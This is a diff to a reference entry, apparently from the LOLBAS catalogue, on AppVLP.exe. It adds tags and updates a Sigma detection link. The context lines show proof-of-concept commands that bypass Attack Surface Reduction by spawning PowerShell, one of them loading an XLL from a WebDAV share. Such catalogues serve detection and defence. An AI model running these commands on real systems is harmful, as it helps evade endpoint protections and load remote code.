@@ -11,6 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 10 w/Office 2016
+    Tags:
+      - Execute: CMD
   - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"
     Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
     Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
@@ -18,6 +20,8 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 10 w/Office 2016
+    Tags:
+      - Execute: EXE
   - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
     Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
     Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
@@ -25,13 +29,13 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 10 w/Office 2016
+    Tags:
+      - Execute: EXE
 Full_Path:
   - Path: C:\Program Files\Microsoft Office\root\client\appvlp.exe
   - Path: C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe
-Code_Sample:
-  - Code:
 Detection:
-  - Sigma: https://github.com/SigmaHQ/sigma/blob/8b170ff5628376c87632635a5fde4e48bba70275/rules/windows/builtin/win_asr_bypass_via_appvlp_re.yml
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_appvlp.yml
 Resources:
   - Link: https://github.com/MoooKitty/Code-Execution
   - Link: https://twitter.com/moo_hax/status/892388990686347264
@@ -44,4 +48,3 @@ Acknowledgement:
     Handle: '@moo_hax'
   - Person: Matt Wilson
     Handle: '@enigma0x3'
----
